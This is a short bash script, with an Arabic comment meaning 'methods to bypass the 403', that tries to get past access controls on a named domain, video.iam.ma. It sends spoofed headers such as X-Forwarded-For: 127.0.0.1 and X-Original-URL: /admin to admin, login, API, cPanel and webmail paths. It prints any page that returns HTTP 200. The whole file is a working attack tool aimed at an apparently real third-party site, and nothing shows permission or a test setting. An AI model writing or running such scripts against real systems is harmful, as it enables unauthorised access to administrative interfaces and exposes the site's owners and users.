#!/bin/bash

TARGET="video.iam.ma"

echo "Bypassing 403 on $TARGET..."
echo ""

# طرق تجاوز الـ 403
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Real-IP: 127.0.0.1"
    "Client-IP: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Host: localhost"
)

PATHS="/admin /login /api /graphql /cpanel /webmail"

for path in $PATHS; do
    echo "=== Testing $path ==="
    for header in "${HEADERS[@]}"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" -k -H "$header" "https://$TARGET$path")
        if [ "$status" = "200" ]; then
            echo -e "\033[0;32m[SUCCESS] $header -> $path (HTTP 200)\033[0m"
            curl -s -k -H "$header" "https://$TARGET$path" | head -20
            echo ""
        elif [ "$status" = "403" ]; then
            echo "  $header: $status"
        fi
    done
done
